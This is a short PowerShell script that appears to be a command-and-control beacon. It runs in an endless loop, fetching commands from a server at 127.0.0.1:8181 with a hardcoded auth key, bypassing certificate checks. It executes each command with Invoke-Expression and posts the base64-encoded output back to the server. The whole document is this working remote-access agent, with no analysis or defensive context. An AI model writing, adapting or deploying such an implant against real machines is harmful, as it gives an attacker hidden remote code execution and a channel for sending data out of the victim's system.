$secret_key = "RkRrcitEQ3AkSEIvYW0kQVUmQkE3N151dTdUPVJkQW9OJk07RnUw"
$identifier = "5617363956173639561736395617363956173638398399"
$base_url = "https://127.0.0.1:8181/"
$sleep_time = 1



$headers =@{
    "X-Auth"=$secret_key
    "Identifier"=$identifier
}

while ($true) {
    Start-Sleep -second $sleep_time
    $command_url ="{0}command" -f $base_url
    $output = Invoke-RestMethod -Uri $command_url -Headers $headers -SkipCertificateCheck
    $output = "$output"
    if ($output -eq "registration_error") {
        $uri = "{0}checkin" -f $base_url
        Invoke-RestMethod -Uri $uri -Headers $headers -SkipCertificateCheck > $null 
    }else{
        if ($output -ne "" -And $output -ne $null){
            $url = "{0}output" -f $base_url
            $stdout = ""
            $stderr = ""
            $base64_command = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output))
            $command_output = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64_command))
            try {
                $command_output = Invoke-Expression "$command_output"
                $base64_output = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($command_output))
                Invoke-RestMethod -Uri $url -Method Post -Body $base64_output -Headers $headers -SkipCertificateCheck > $null 
            }catch{
                $error_details = "$_.ErrorDetails.Message.message"
                $base64_output = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($error_details))
                Invoke-RestMethod -Uri $url -Method Post -Body $base64_output -Headers $headers -SkipCertificateCheck > $null
            }

        }
    }

}